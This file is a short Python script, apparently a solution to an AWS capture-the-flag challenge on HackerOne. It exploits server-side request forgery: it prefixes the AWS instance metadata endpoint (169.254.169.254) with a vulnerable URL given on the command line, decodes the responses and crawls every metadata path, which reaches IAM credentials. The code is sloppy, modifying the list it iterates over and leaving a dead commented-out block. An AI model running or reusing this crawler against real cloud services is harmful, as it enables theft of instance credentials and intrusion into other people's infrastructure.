import requests
from base64 import b64decode
from json import loads
import sys

#AWS CTF HackerOne

def b64DecodeToString(b64Text):
	return b64decode(loads(b64Text)['page']).decode('utf-8')


if "__main__" == __name__:

	FUCKING_DOMAIN_LIST_ACCESS = []

	if len(sys.argv) > 1:

		urlScrapper = ('{}http://169.254.169.254/latest/').format(sys.argv[1])

		htmlMetadata = b64DecodeToString(requests.get(urlScrapper).text)

		while True:

			for a in htmlMetadata.split('\n'):

				if "user-data" in a:
					continue

				FUCKING_DOMAIN_LIST_ACCESS.append(a)

			for b in FUCKING_DOMAIN_LIST_ACCESS:

				htmlMetadata = b64DecodeToString(requests.get(urlScrapper + b ).text)

				print(b)

				for c in htmlMetadata.split('\n'):

					FUCKING_DOMAIN_LIST_ACCESS.append(b + "/" + c)

					print(c)

				FUCKING_DOMAIN_LIST_ACCESS.remove(b)

			break
			"""
			urlDomain = (urlScrapper + b + "/")

			print('Node Number:', (a+1))

			getInfoNode = requests.get(urlDomain)

			print(getInfoNode)

			if getInfoNode.status_code != 200:
				continue

			getNextTree = requests.get(urlDomain + b64DecodeToString(getInfoNode.text)).text

			print(b64DecodeToString(getNextTree))
			"""

